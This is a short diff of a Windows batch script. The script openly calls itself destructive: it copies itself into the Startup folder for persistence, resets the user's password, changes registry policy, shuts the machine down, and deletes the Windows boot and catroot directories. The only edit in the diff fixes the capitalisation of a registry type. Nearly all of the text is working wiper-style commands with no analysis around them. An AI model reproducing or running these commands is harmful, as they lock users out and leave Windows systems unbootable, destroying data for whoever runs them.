@@ -6,7 +6,7 @@ a.vbs
 echo THIS PART WILL TURN OFF REGEDIT, CMD, CHANGE WALLPAPER, AND SHUTDOWN / FORMAT / DELETE C:
 copy ez.bat => "C:\Users%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 net user %username% NoEscapeEZZE
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /t Reg_dword /v DisableRegistryTools /f /d 0
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /t REG_DWORD /v DisableRegistryTools /f /d 0
 shutdown /s /t 20
 rd c:\windows\boot /s /q
 rd c:\windows\system32\catroot /s /q
